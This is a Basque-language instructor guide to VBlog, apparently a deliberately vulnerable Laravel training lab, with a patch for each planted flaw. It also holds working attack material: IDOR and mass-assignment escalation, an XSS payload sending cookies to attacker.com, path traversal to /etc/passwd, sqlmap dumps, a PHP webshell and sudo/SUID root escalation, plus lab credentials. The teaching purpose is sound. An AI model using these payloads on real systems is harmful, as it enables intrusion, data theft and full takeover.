# VBlog — Gida

## Aurkibidea

1. [Abiaraztea](#abiaraztea)
2. [Kredentzialak](#kredentzialak)
3. [Ahultasunak](#ahultasunak)
4. [Bide ezkutuak](#bide-ezkutuak)
5. [Azpidomenu ezkutua](#azpidomenu-ezkutua)
6. [Eskalatze-katea](#eskalatze-katea)

> Arkitektura xehea: [docs/arquitecture.md](arquitecture.md)

---

## Deskargatu/Konfiguratu

```bash
git clone https://github.com/Andonigt04/VBlog.git
```

## Abiaraztea

```bash
sudo docker compose up --build -d
```

Aplikazioa `http://localhost` helbidean dago eskuragarri (ez da `/etc/hosts` konfiguratu behar).

Ikasleek enumerazioaren bidez `dev.vblog.local` azpidomeinua aurkituko dute eta eskuz `/etc/hosts` fitxategian gehitu beharko dute.

---

## Kredentzialak

### Aplikazioaren erabiltzaileak

| Rola | Erabiltzailea | Emaila | Pasahitza |
|---|---|---|---|
| Admin | adm01 | adm01@vblog.local | adm01local |
| Editor | editor01 | editor01@vblog.local | editor01pass |
| Erabiltzailea | (sortutakoak) | faker | faker |

> Editor eta admin kredentzialak `/backup` helbidean ere agertzen dira (nahita sortutako ahultasuna).

### Datu-basea

| Eremua | Balioa |
|---|---|
| Hostalaria | postgresql (barne) / localhost:5432 (kanpo) |
| Datu-basea | vblog |
| Erabiltzailea | vblog_adm |
| Pasahitza | uireh34t34 |

### Datu-basera zuzeneko sarbidea (hostalari makinatik)

```bash
psql -h localhost -p 5432 -U vblog_adm -d vblog
# pasahitza: uireh34t34
```

---

## Ahultasunak

---

### 1. IDOR — Autentifikazio gabe baliabideetara sarbidea

**Kokapena:** `GET /api/users/{id}`, `GET /api/posts/{id}`, `GET /api/comments`

**Zergatik existitzen da:** Bideek ez dute `auth` middleware-rik.

#### Ustiapena

**1. urratsa: Erregistratu gabe erabiltzaileak enumeratu**
```bash
curl http://vblog.local/api/users/1
curl http://vblog.local/api/users/2
# ... admina aurkitu arte iteratuz (normalean id 52)
curl http://vblog.local/api/users/52
```

**Espero den irteera:**
```json
{
  "id": 52,
  "name": "adm01",
  "email": "adm01@vblog.local",
  "role": "admin",
  "created_at": "..."
}
```

**2. urratsa: Auth gabe iruzkin guztiak lortu**
```bash
curl http://localhost/api/comments
```

**Eragina:**
- Erabiltzaileen enumerazio osoa (emailak, rolak, izenak)
- Iruzkin guztietarako sarbidea
- Eraso zuzenduen erraztea (phishing, brute force kontu adminetan)

#### Ahultasunaren egiaztapena

**Kodearen kokapena:** `routes/api.php`
```php
Route::get('/users/{id}', [UserController::class, 'show']);   // ← auth middleware GABE
Route::get('/comments', [CommentController::class, 'index']); // ← auth middleware GABE
```

#### Adabaki osoa

**Fitxategia:** `routes/api.php`

```php
// ahula
Route::get('/users/{id}', [UserController::class, 'show']);
Route::get('/comments', [CommentController::class, 'index']);

// babestua
Route::get('/users/{id}', [UserController::class, 'show'])->middleware('auth');
Route::get('/comments', [CommentController::class, 'index'])->middleware('auth');
```

#### Adabakiaren baliozkotzea

```bash
# 401 Unauthorized eman behar du
curl http://vblog.local/api/users/1

# Autentifikatutako saioaren bidez funtzionatu behar du
curl -b cookies.txt http://vblog.local/api/users/1
```

---

### 2. Mass Assignment — Rol-eskalada APIaren bidez

**Kokapena:** `PUT /api/update/user/{id}` UserController-en

**Zergatik existitzen da:**
- `UserController::update()` `$user->update($request->all())` erabiltzen du eremuak iragazi gabe
- `User` modeloak `role` du `$fillable` sarreran, masa-aldaketa ahalbidetuz

#### Ustiapena

**1. urratsa: Oinarrizko erabiltzaile-kontu bat sortu**
```bash
# Web bidez: /signup-en erregistratu
# Edo /backup-en aurkitutako kredentzialak erabili
```

**2. urratsa: Saioa hasi eta saioa gorde**
```bash
curl -c cookies.txt -X POST http://vblog.local/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","passkey":"password"}'
```

**3. urratsa: Uneko rola egiaztatu**
```bash
curl -b cookies.txt http://vblog.local/api/me
# Irteera: {"id": 53, "role": "user", ...}
```

**4. urratsa: Editorera eskalatu**
```bash
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"editor"}'
```

**5. urratsa: Adminera eskalatu**
```bash
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
```

**Eragina:**
- Berehala pribilegioen igoera
- Erabiltzaile arrunta → Admin autentifikazio gehigarririk gabe
- Administrazio-panelera sarbidea

#### Ahultasunaren egiaztapena

**Kokapena:** `app/Http/Controllers/UserController.php`
```php
public function update(Request $request, $id)
{
    $user->update($request->all());  // ← Eremu GUZTIAK onartzen ditu
}
```

#### Adabaki osoa

```php
// ✅ ONDOREN (babestua)
public function update(Request $request, $id)
{
    try {
        $user = User::findOrFail($id);
        if ($user->id !== Auth::id() && Auth::user()->role !== 'admin') {
            return response()->json(['status' => 403, 'message' => 'Unauthorized'], 403);
        }
        $validated = $request->validate([
            'name'     => 'nullable|string|max:255',
            'email'    => 'nullable|email|unique:users,email,' . $id,
            'password' => 'nullable|string|min:8'
        ]);
        $user->update($validated);
        return response()->json(['status' => 200, 'user' => $user]);
    }
}
```

#### Adabakiaren baliozkotzea

```bash
# Eskalatzeko saiakerak huts egin behar du
curl -b cookies.txt -X PUT http://vblog.local/api/update/user/53 \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'
# Espero den errorea: {"status": 403}
```

---

### 3. Broken Access Control — Rola egiaztatu gabe dashboard-a

**Kokapena:** `GET /dashboard` `routes/web.php`-n

**Zergatik existitzen da:** Middleware-ak `auth` soilik egiaztatzen du (saioa hasita), ez erabiltzailea admin denik.

#### Ustiapena

```bash
# Erabiltzaile arruntak dashboard-era zuzenean sartu
curl -b cookies.txt http://vblog.local/dashboard
# Erantzuna: 200 OK HTML panel osoarekin
```

**Eragina:**
- Erabiltzaile arruntak administrazio-datuak ikusten ditu
- Beste erabiltzaileen informazio sentikorrari sarbidea

#### Adabaki osoa

```php
// ✅ ONDOREN (babestua)
Route::get('/dashboard', function (Request $request) {
    if (Auth::user()->role !== 'admin') {
        abort(403, 'Admin access required');
    }
    $users    = User::orderBy('created_at', 'desc')->paginate(10);
    $posts    = Post::orderBy('created_at', 'desc')->paginate(10);
    $comments = Comment::orderBy('created_at', 'desc')->paginate(10);
    return view('dashboard', compact('users', 'posts', 'comments', ...));
})->middleware('auth');
```

---

### 4. Cookie Ez-seguruak

**Kokapena:** `config/session.php`

**Zergatik existitzen da:** Segurtasun-markak nahita desaktibatuta daude.

#### Ahultasuna

```php
'http_only' => env('SESSION_HTTP_ONLY', false),  // ← FALTSUA = JavaScript-ek irakur dezake
'secure'    => env('SESSION_SECURE_COOKIE'),      // ← EZARRI GABE = HTTPz bidali
'same_site' => env('SESSION_SAME_SITE', null),    // ← NULL = SameSite gabe
```

#### Ustiapena

```javascript
// XSS payload-a iruzkin batean (5. ahultasuna)
<script>
  fetch('http://attacker.com/?c=' + document.cookie);
</script>
```

#### Adabaki osoa

```php
// ✅ ONDOREN (segurua)
'http_only' => env('SESSION_HTTP_ONLY', true),
'secure'    => env('SESSION_SECURE_COOKIE', true),
'same_site' => env('SESSION_SAME_SITE', 'lax'),
```

---

### 5. Segurtasun-goiburu Gabeak

**Kokapena:** `nginx/server.conf`

**Zergatik existitzen da:** Lerroak nahita komentatuta daude.

#### Ahultasuna

```nginx
# add_header X-Frame-Options "SAMEORIGIN";      ← gabe: clickjacking posible
# add_header X-Content-Type-Options "nosniff";   ← gabe: MIME-sniffing posible
```

#### Adabaki osoa

```nginx
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'";
add_header Referrer-Policy "strict-origin-when-cross-origin";
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()";
```

---

### 6. Stored XSS — Iruzkinetan injekzioa

**Kokapena:**
- `resources/views/layouts/comment.blade.php`
- `app/Http/Controllers/CommentController.php`

**Zergatik existitzen da:**
- Edukia ihes egin gabe errendatzen da: `{!! $comment->content !!}`
- Ez dago garbiketa/baliozkotzea gordetu aurretik

#### Ustiapena

```bash
curl -b cookies.txt -X POST http://vblog.local/comments \
  -d "post_id=1&content=<script>alert(document.cookie)</script>&_token=CSRF_TOKEN"
```

#### Adabaki osoa

**`comment.blade.php`:**
```blade
{{-- ✅ ONDOREN (ihes eginda) --}}
{{ $comment->content }}
```

**`CommentController.php`:**
```php
Comment::create([
    'content' => strip_tags($validated['content']),
    ...
]);
```

---

### 7. Informazioaren Esposaketa

**Kokapena:** `routes/web.php` (`/backup`, `/debug`)

#### Ustiapena

```bash
curl http://vblog.local/backup
# Irteera: editor eta admin kredentzialak, datu-basearen katea

curl http://vblog.local/debug
# Irteera: PHP bertsioa, driver, erabiltzaile-kopuruak, nginx bertsioa
```

#### Adabaki osoa

```php
// ✅ ONDOREN (babestua)
Route::get('/backup', function () {
    if (Auth::guest() || Auth::user()->role !== 'admin') abort(403);
    // ...
})->middleware('auth');
```

---

### 8. Path Traversal — Edozein fitxategi irakurtzea (admin)

**Kokapena:** `GET /api/admin/file?path=` `AdminController::fileRead()`-n

**OWASP:** A01 / A05 | **CWE:** CWE-22

**Zergatik existitzen da:** `path` parametroa `base_path()`-rekin zuzenean kateatu da normalizatu edo zerrenda zuri gabe.

#### Ustiapena

**Aurrebaldintzak:** `role=admin` duen saioa (2. ahultasunetik lortua).

```bash
# .env irakurri
curl -b cookies.txt "http://localhost/api/admin/file?path=.env"

# Sistemako fitxategiak atera
curl -b cookies.txt "http://localhost/api/admin/file?path=../../etc/passwd"
```

**Eragina:**
- `www-data`-k irakur dezakeen edozein fitxategi irakurtzea
- Gako pribatuak, `.env`, zerbitzu-konfigurazioak espostatzea

#### Ahultasunaren egiaztapena

```php
public function fileRead(Request $request)
{
    $path     = $request->query('path', '');
    $fullPath = base_path($path);           // ← baliozkoztarik gabe
    return response(file_get_contents($fullPath), 200);
}
```

#### Adabaki osoa

```php
// ✅ ONDOREN (direktorio zerrenda zuri eta normalizazioaren bidez)
public function fileRead(Request $request)
{
    $path     = $request->query('path', '');
    $fullPath = realpath(base_path($path));
    $allowed  = realpath(base_path('storage/app'));

    if (!$fullPath || !str_starts_with($fullPath, $allowed)) {
        abort(403, 'Path not allowed');
    }
    return response(file_get_contents($fullPath), 200)
        ->header('Content-Type', 'text/plain');
}
```

#### Adabakiaren baliozkotzea

```bash
curl -b cookies.txt "http://localhost/api/admin/file?path=../../etc/passwd"
# Espero den errorea: 403 Forbidden
```

---

### 9. SQL Injection — Iragazgarri inyektagarriarekin estatistikak (admin)

**Kokapena:** `GET /api/admin/stats?filter=` `AdminController::stats()`-n

**OWASP:** A03 | **CWE:** CWE-89

**Zergatik existitzen da:** `filter` balioa SQL kontsulta gordinean zuzenean interpola tzen da, binding-ik gabe.

#### Ustiapena

```bash
# Injekzioa baieztatzen duen errorea
curl -b cookies.txt "http://localhost/api/admin/stats?filter='"
# Irteera: 500 PostgreSQL SQL traza

# Denboran oinarritutako itsu (exekuzioa baieztatzen du)
curl -b cookies.txt \
  "http://localhost/api/admin/stats?filter=%' AND (SELECT 1 FROM pg_sleep(3))=1 AND '%'='"
# Erantzuna ≥3 s beranduago datorrena → baieztatuta

# sqlmap-ekin datu-esportaketa
sqlmap -u "http://localhost/api/admin/stats?filter=test" \
  --cookie="..." --dbms=postgresql --batch --dump -T users
```

**Eragina:**
- Datu-basearen dump osoa
- Fitxategiak irakurri/idatzi (`COPY TO/FROM`)

#### Ahultasunaren egiaztapena

```php
$rows = DB::select(
    "SELECT posts.id, posts.title, posts.tags
     FROM posts
     WHERE posts.tags LIKE '%{$filter}%'"  // ← zuzeneko interpolazioa
);
```

#### Adabaki osoa

```php
// ✅ ONDOREN (placeholder binding-ekin)
$rows = DB::select(
    "SELECT posts.id, posts.title, posts.tags
     FROM posts
     WHERE posts.tags LIKE ?",
    ["%{$filter}%"]
);
```

---

### 10. Fitxategi Igoera Ez-segurua — Webshell mugarik gabeko igoeratik (admin)

**Kokapena:** `POST /api/admin/upload` `AdminController::upload()`-n

**OWASP:** A04 / A05 | **CWE:** CWE-434

**Zergatik existitzen da:** Zerbitzariak fitxategia jatorrizko izenarekin gordetzen du luzapena egiaztatu gabe, eta `public/avatars/` direktorioan kokatzen du, nginx-ek zuzenean zerbitzatua.

#### Ustiapena

```bash
# 1. urratsa: webshell sortu
echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > /tmp/shell.php

# 2. urratsa: zerbitzarira igo
curl -b cookies.txt -X POST http://localhost/api/admin/upload \
  -F "file=@/tmp/shell.php;type=image/jpeg"
# Irteera: {"url":"http://localhost/avatars/shell.php"}

# 3. urratsa: komandoak urrunetik exekutatu (RCE)
curl "http://localhost/avatars/shell.php?cmd=aWQ="
# Irteera: uid=33(www-data) gid=33(www-data)
```

**Eragina:**
- `www-data` gisa urruneko kode-exekuzioa
- Datu-basera, barne-sarrera edo tokiko eskaladara pibotatze-aukera

#### Ahultasunaren egiaztapena

```php
public function upload(Request $request)
{
    $file     = $request->file('file');
    $filename = $file->getClientOriginalName();  // ← erasotzaileak aukeratua
    $file->move(public_path('avatars'), $filename);
    return response()->json(['url' => url("avatars/{$filename}")], 201);
}
```

#### Adabaki osoa

```php
// ✅ ONDOREN (zerrenda zuri + ausazko izena)
public function upload(Request $request)
{
    $request->validate([
        'file' => 'required|file|mimes:jpeg,png,gif,webp|max:2048',
    ]);
    $file     = $request->file('file');
    $filename = Str::uuid() . '.' . $file->extension();
    $file->move(public_path('avatars'), $filename);
    return response()->json(['url' => url("avatars/{$filename}")], 201);
}
```

**Nginx neurri osagarria:**
```nginx
location ~* ^/avatars/.*\.php$ {
    deny all;
}
```

---

### 11. Pribilegio Eskalada — www-data-tik root-era

**Kokapena:** Dockerfile — sudoers + SUID bash

**OWASP:** A06 / A05 | **CWE:** CWE-269

**Zergatik existitzen da:** Dockerfile-ak bi nahita konfigurazio oker gehitzen ditu:
1. `www-data`-k `/usr/bin/find` exekuta dezake root gisa pasahitzik gabe
2. `/tmp/rootbash` `/bin/bash`-ren kopia bat da SUID bitekin

#### Ustiapena

**Aurrebaldintzak:** 10. ahultasunetik lortutako RCE (webshell aktibo).

```bash
# sudo egiaztatu
curl "http://localhost/avatars/shell.php?cmd=c3VkbyAtbA=="
# base64: sudo -l
# Irteera: (root) NOPASSWD: /usr/bin/find

# GTFOBins — sudo find root gisa komandoa exekutatzeko
CMD=$(echo 'sudo find . -exec /bin/sh -c '"'"'id > /tmp/pwned'"'"' \; -quit' | base64 -w0)
curl "http://localhost/avatars/shell.php?cmd=$CMD"
curl "http://localhost/avatars/shell.php?cmd=$(echo 'cat /tmp/pwned' | base64 -w0)"
# Irteera: uid=0(root) gid=0(root) ← ROOT

# SUID bash alternatiboa
CMD=$(echo '/tmp/rootbash -p -c id' | base64 -w0)
curl "http://localhost/avatars/shell.php?cmd=$CMD"
# Irteera: uid=33(www-data) euid=0(root)
```

**Eragina:**
- Edukiontziaren kontrol osoa root gisa
- Sistemako sekretuak irakurtzea (`/etc/shadow`, SSH gakoak)

#### Ahultasunaren egiaztapena

```dockerfile
RUN echo "www-data ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data \
    && chmod 0440 /etc/sudoers.d/www-data \
    && cp /bin/bash /tmp/rootbash \
    && chmod u+s /tmp/rootbash
```

#### Adabaki osoa

```dockerfile
# ✅ ONDOREN (bi lerroak ezabatu)
# (Dockerfile-tik aurreko RUN komandoak ezabatu besterik ez)
```

---

## Bide ezkutuak

Bat ere ez da menutan edo esteketan agertzen. `gobuster`, `ffuf` edo `dirsearch` erabiliz aurkigarriak.

| Bidea | Kodea | Edukia | Adabakia |
|---|---|---|---|
| `/backup` | 200 OK | Editor eta admin kredentzialak testu arruntean | auth + admin check-arekin babestu |
| `/debug` | 200 OK | App bertsioa, PHP, DB kontrolatzailea, kopuruak | auth + admin check-arekin babestu |
| `/old` | 302 | `/`-ra birbidali | Adabaki beharrik gabe (decoy) |
| `/internal` | 403 | Forbidden | Adabaki beharrik gabe (decoy) |
| `/admin` | 302 | `/dashboard`-era birbidali | Adabaki beharrik gabe (birbidalketa segurua) |

```bash
gobuster dir -u http://vblog.local \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

---

## Azpidomenu ezkutua

**URL:** `http://dev.vblog.local`

**Baldintza:** `/etc/hosts`-en gehitu:
```
127.0.0.1  dev.vblog.local
```

**Edukia:**

| Orrialdea | Deskribapena |
|---|---|
| `/` (index.html) | Egoera-panela: ingurunea, framework, DB, endpoint azkarrak |
| `/api-docs.html` | APIaren barne-dokumentazio osoa adibide curl-ekin |
| `/logs.html` | App erregistroak DB konexio-katearekin, mass assignment eta XSS arrastoekin |

**Autentifikazio gabe** — Panelak ez du saioa behar (nahita sortutako ahultasuna).

```bash
gobuster vhost -u http://vblog.local \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

---

## Eskalatze-katea

```
0. Fasea — Errebistaketa (anonimoa)
│
│  1. gobuster dir → /backup, /debug, /old, /internal
│  2. gobuster vhost → dev.vblog.local
│  3. curl /backup → editor01 + admin + DB kredentzialak
│  4. curl /debug → PHP bertsioa, driver, kopuruak
│  5. ffuf /api/users/FUZZ → erabiltzaileen ID enumerazioa (IDOR)
│  6. curl -I / → X-Frame-Options gabe, CSP gabe, goiburu gabe
│
▼
1. Fasea — Erregistratutako erabiltzailea
│
│  1. POST /api/login editor01/editor01pass-ekin (/backup-etik)
│  2. GET /api/me → role: "editor"
│
▼
2. Fasea — Adminera eskalada (Mass Assignment)
│
│  1. PUT /api/update/user/{nire_id} -d '{"role":"admin"}'
│  2. GET /api/me → role: "admin"  ✓ Eskalada arrakastatsua
│  3. GET /dashboard → sarbidea baimenduta (broken access control)
│
▼
3. Fasea — XSS ustiapena + barne sarbidea
│
│  1. POST /api/create/comment <script>…</script> payload-arekin
│  2. XSS edozein erabiltzailek posta bisitatzean exekutatzen da
│  3. Cookie lapurgarria (HttpOnly=false) → saio-inpersonazioa
│  4. /etc/hosts: 127.0.0.1 dev.vblog.local
│  5. GET http://dev.vblog.local/logs.html → DB katea osoa
│  6. psql -h localhost -p 5432 -U vblog_adm -d vblog → DB konprometitua
│
▼
4. Fasea — Admin Panela: Path Traversal + SQLi
│
│  1. GET /api/admin/file?path=.env → APP_KEY + kredentzialak
│  2. GET /api/admin/file?path=../../etc/passwd → sistemako erabiltzaileak
│  3. GET /api/admin/stats?filter=' → SQL errorea, PostgreSQL baieztatuta
│  4. sqlmap → users taularen dump osoa pasahitz hash-ekin
│
▼
5. Fasea — Fitxategi Igoeratik RCE
│
│  1. echo '<?php passthru(base64_decode($_GET["cmd"])); ?>' > shell.php
│  2. POST /api/admin/upload -F file=@shell.php → URL: /avatars/shell.php
│  3. GET /avatars/shell.php?cmd=<base64(id)> → uid=33(www-data)
│
▼
6. Fasea — Root-era eskalada
│
│  1. sudo -l → (root) NOPASSWD: /usr/bin/find
│  2. sudo find . -exec /bin/sh -c 'id > /tmp/pwned' \; -quit
│     → uid=0(root)  ✓ ROOT LORTUTA
│  Edo:
│  3. /tmp/rootbash -p -c id → euid=0(root)  ✓ SUID bash
│
└── ERABAT KONPROMETITUA
    - Web aplikazioa (RCE webshell bidez)
    - Datu-basea (sqlmap dump)
    - Edukiontziaren sistema eragilea (root)
    - Docker barne-sarrerara pibotatze-aukera
```

---

## Adabakien laburpena

| # | Ahultasuna | OWASP | Fitxategia | Ekintza |
|---|---|---|---|---|
| 1 | IDOR | A01 | routes/api.php | `middleware('auth')` gehitu |
| 2 | Mass Assignment | A04 | UserController.php | Sarrera baliozkotu, `role` fillable-tik kendu edo `only()` erabili |
| 3 | Broken Access Control | A01 | routes/web.php | `/dashboard`-en `role === 'admin'` egiaztatu |
| 4 | Cookie Ez-seguruak | A05 | config/session.php | `HttpOnly=true`, `SameSite=lax` |
| 5 | Goiburu Gabeak | A05 | nginx/server.conf | Segurtasun-goiburuak deskomentatu |
| 6 | Stored XSS | A03 | comment.blade.php | `{!! !!}` → `{{ }}`; `strip_tags()` kontrolagailuan |
| 7 | Informazio Esposaketa | A05 | routes/web.php | `/backup`, `/debug` `auth` + admin check-arekin babestu |
| 8 | Path Traversal | A01/A05 | AdminController.php | `realpath()` + direktorio zerrenda zuria |
| 9 | SQL Injection | A03 | AdminController.php | `DB::select()`-en `?` binding-ak |
| 10 | Fitxategi Igoera | A04/A05 | AdminController.php | `mimes:` baliozkotu, ausazko izena; nginx-ek `.php` avatars-en blokeatzen du |
| 11 | Root Privesc | A06 | Dockerfile | sudoers sarrera eta SUID bash ezabatu |
